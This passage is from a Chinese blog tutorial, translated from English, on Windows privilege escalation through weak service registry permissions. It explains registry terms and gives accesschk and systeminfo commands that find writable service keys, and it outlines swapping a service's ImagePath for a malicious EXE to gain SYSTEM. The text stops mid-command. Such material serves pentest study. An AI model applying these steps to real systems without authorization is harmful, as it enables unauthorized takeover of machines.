<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Windows 提权/Windows 提权-服务_弱注册表权限" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Windows 提权-服务_弱注册表权限 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows 提权-服务_弱注册表权限 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 Weak Registry Key Permissions – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 Weak Registry Key Permissions – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.3453dfb7.css">
<script src="/web/assets/js/runtime~main.3e5c23bd.js" defer="defer"></script>
<script src="/web/assets/js/main.eab2f939.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/category/️渗透">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/️渗透">🕵️渗透</a><button aria-label="折叠侧边栏分类 &#x27;🕵️渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="展开侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="折叠侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-MSSQL">Windows 提权-MSSQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare">Windows 提权-PrintNightmare</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-RunAs">Windows 提权-RunAs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeBackupPrivilege 特权">Windows 提权-SeBackupPrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权">Windows 提权-SeImpersonatePrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-UAC 绕过">Windows 提权-UAC 绕过</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-不安全的 GUI 程序">Windows 提权-不安全的 GUI 程序</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_1">Windows 提权-内核利用_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_2">Windows 提权-内核利用_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-密码搜寻">Windows 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-手工枚举">Windows 提权-手工枚举</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_DLL 劫持">Windows 提权-服务_DLL 劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限">Windows 提权-服务_弱文件_目录权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限">Windows 提权-服务_弱服务权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限">Windows 提权-服务_弱注册表权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_未引用的服务路径">Windows 提权-服务_未引用的服务路径</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">🐧Linux</a><button aria-label="展开侧边栏分类 &#x27;🐧Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">💻Windows</a><button aria-label="展开侧边栏分类 &#x27;💻Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">📦杂项</a><button aria-label="展开侧边栏分类 &#x27;📦杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/gpt-问答">🤖GPT 问答</a><button aria-label="展开侧边栏分类 &#x27;🤖GPT 问答&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">🛠️软件百宝箱</a></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/️渗透"><span itemprop="name">🕵️渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/windows-提权"><span itemprop="name">Windows 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Windows 提权-服务_弱注册表权限</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows 提权-服务_弱注册表权限</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/weak-registry-key-permissions/" target="_blank" rel="noopener noreferrer">Weak Registry Key Permissions – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 搜寻服务的弱权限注册表项</a>
<ul>
<li><a href="#id1.1">1.1 枚举弱权限注册表项：accesschk.exe</a></li>
<li><a href="#id1.2">1.2 枚举弱权限注册表项：PowerShell + Linux-Fu</a></li>
<li><a href="#id1.3">1.3 枚举弱权限注册表项：winPEAS.exe</a></li>
</ul>
</li>
<li><a href="#id2">2 分析服务的弱权限注册表项</a></li>
<li><a href="#id3">3 利用服务的弱权限注册表项</a>
<ul>
<li><a href="#id3.1">3.1 制作恶意程序</a></li>
<li><a href="#id3.2">3.2 利用注册表键</a></li>
</ul>
</li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将学习一种涉及注册表的权限提升技术。我们将看到，由于服务注册表权限管理的薄弱，导致攻击者可以由标准用户权限提升到本地 SYSTEM 权限。</p>
<p>首先，我们会使用几种不同的枚举工具去查找与服务相关的注册表项，试图找到任何权限较弱的键。其次，在这个键下面寻找与服务绑定信息相关的值（主要是 imagePath 值）。然后，我们会制作一个恶意程序，并将这个 imagePath 的值从原始路径替换为指向恶意程序的路径。最后，重启该服务，该服务将执行恶意 EXE 并为我们提供一个 SYSTEM shell。</p>
<p>通过篡改服务使用的注册表项，攻击者可以操纵服务可执行文件的执行位置。攻击者可能没有任何权限滥用服务本身，但如果能够滥用与该服务相关的注册表项，攻击者就有能力绕过权限限制直接操纵服务。</p>
<blockquote>
<p>由于注册表是应用程序和系统组件（例如服务）存储配置数据的地方，而如果我们能够操纵服务存储配置数据的位置，那么也就意味着我们可以改变服务启动程序的位置。</p>
</blockquote>
<blockquote>
<p>注：注册表相关术语名词介绍。</p>
<p><strong>键（Key）</strong>：类似于文件系统中的“文件夹”，用于存储注册表值。</p>
<p><strong>根键（Root Key）</strong>：注册表的最高层级键，共有五个主要根键，分别是：HKCU（存储当前登录用户的配置信息）、HKLM（存储计算机范围内的配置信息）、HKU（存储计算机上所有用户的配置信息）、HKCR（存储文件扩展名、程序关联信息等）、HKCC（存储当前硬件配置文件的动态数据）。</p>
<p><strong>子键（Subkey）</strong>：键中的子层级，例如 <code>HKEY_LOCAL_MACHINE\SYSTEM</code> 中，<code>SYSTEM</code> 是 <code>HKEY_LOCAL_MACHINE</code> 的子键。</p>
<p><strong>值（Value）</strong>：存储在键中的具体数据，每个键可以包含多个值。</p>
<p><strong>注册表项（Registry Entry）</strong>：指具体的键或值。</p>
<p><strong>注册表路径（Registry Path）</strong>：访问注册表中某个键的完整路径，</p>
<p><strong>注册表权限</strong>：控制哪些用户或程序可以读取、修改注册表键值。</p>
<p><strong>注册表脚本（.reg 文件）</strong>：用于批量导入或修改注册表的文本文件。</p>
</blockquote>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1搜寻服务的弱权限注册表项"><strong><div id="id1">1、搜寻服务的弱权限注册表项</div></strong><a href="#1搜寻服务的弱权限注册表项" class="hash-link" aria-label="1搜寻服务的弱权限注册表项的直接链接" title="1搜寻服务的弱权限注册表项的直接链接">​</a></h2>
<p>在搜寻有关服务的注册表项时，我们主要的关注点是 <code>HKLM\SYSTEM\CurrentControlSet\Services</code> 路径下面的子键，因为这里是专门用来存储系统中所有服务配置数据的地方。</p>
<p>在接下来的示例中，假设我们已经作为标准用户 cmarko 在目标机上获得了立足点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193922912-667858872-5f351274bb1912076eb0c9cc4bf30489.png" width="623" height="401" class="img_ev3q"></p>
<p>有多种方法可以用来枚举注册表项的弱权限，但在本例中，我们通过只使用两种不同的工具和一种手动方法去枚举注册表项的权限。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="11枚举弱权限注册表项accesschkexe"><strong><div id="id1.1">1.1、枚举弱权限注册表项：accesschk.exe</div></strong><a href="#11枚举弱权限注册表项accesschkexe" class="hash-link" aria-label="11枚举弱权限注册表项accesschkexe的直接链接" title="11枚举弱权限注册表项accesschkexe的直接链接">​</a></h4>
<p>我们要探索的第一种枚举注册表权限的技术，是使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener noreferrer">Sysinterals</a> 工具套件中的 accesschk.exe 工具。</p>
<p>首先根据受害者机器的系统架构去下载对应的 accesschk 版本，然后将其传输到受害者机器上。</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systeminfo | findstr /B /C:&quot;Host Name&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot; /C:&quot;Hotfix(s)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193923279-1884189429-53ff1644e023028c937d196f1630e96d.png" width="902" height="134" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193920070-829234903-ceaf74c656df80012473cc10dc5e5f2e.png" width="454" height="211" class="img_ev3q"></p>
<p>为了能更好的使用 accesschk 工具和理解它输出的内容，我们要对下面这些用户/组有所了解：</p>
<ul>
<li>%USERNAME% 代表当前登录用户，如 bob。</li>
<li>Authenticated Users【注：通过 <strong>控制台、RDP、WinRM、SMB</strong> 登录系统的用户都属于已认证用户。】</li>
<li>Everyone</li>
<li>BUILTIN\Users</li>
<li>NT AUTHORITY\INTERACTIVE</li>
</ul>
<p>如果在枚举服务相关的注册表项时，能够发现以上任意一个用户/组拥有写入权限，那我们就可利用这个服务。</p>
<p>使用 accesschk 时，我们首先检查当前用户，因为当前用户可能默认属于这些组中的大多数。【最主要的是，查看其它组的最终目的不还是为了当前用户吗】</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">accesschk64.exe &quot;%USERNAME%&quot; -kvuqsw hklm\System\CurrentControlSet\services -accepteula</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193922573-1956563161-f7f668be361cb588098cf51d49169e74.png" width="926" height="279" class="img_ev3q"></p>
<p>可以看到，当前用户对 Juggernaut 服务的注册表项拥有 ALL_ACCESS 权限，即“完全控制”的权限。【而该权限的由来，可能是因为这个注册表项就是针对这个用户本身开放的 ALL_ACCESS 权限，也可能是针对某个组开放的权限，只不过当前用户正好就在其中。】</p>
<p>此外，也可以通过以下命令分别查询其它组拥有哪些服务的注册表项写入权限：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">accesschk64.exe &quot;Everyone&quot; -kqswvu hklm\System\CurrentControlSet\services -accepteula</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">accesschk64.exe &quot;Authenticated Users&quot; -kqswvu hklm\System\CurrentControlSet\services -accepteula</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">accesschk64.exe &quot;BUILTIN\Users&quot; -kqswvu 